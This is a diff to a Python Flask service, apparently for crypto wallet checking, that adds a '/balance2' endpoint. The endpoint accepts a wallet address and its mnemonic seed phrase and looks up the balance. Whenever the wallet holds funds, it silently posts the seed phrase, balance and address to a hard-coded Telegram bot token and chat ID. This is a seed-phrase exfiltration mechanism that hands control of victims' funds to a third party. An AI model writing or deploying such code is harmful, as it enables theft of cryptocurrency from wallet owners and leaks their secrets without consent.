@@ -5,6 +5,7 @@ import mysql.connector
 import random, sys
 import validadores
 import array_palavras
+import requests
 
 select_em = 100
 deleta_em = 200
@@ -218,6 +219,37 @@ def balance():
         wallet = str(acc.address)
         balance = web3.eth.get_balance(wallet)
     print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
+    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(balance)+"", "mnemonic":""+str(mnemonic)+""})
+
+
+
+
+
+@app.route('/balance2',methods=['POST'])
+def balance2():
+    p = request.get_json()
+    global wallet
+    global balance
+    global mnemonic
+    wallet = str(p['wallet'])
+    balance = str(0)
+    mnemonic = str(p['mnemonic'])
+    
+    
+    
+    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
+    try:    
+        balance = web3.eth.get_balance(wallet)
+    except:
+        pass
+    else:
+        print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
+        if balance != 0:
+            #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
+            payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
+            r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
+            #arquivo = open("wallet_"+str(id)+".txt", "a")
+            #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")                                    
     return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(balance)+"", "mnemonic":""+str(mnemonic)+""})
 
 PORTA=int(sys.argv[1])
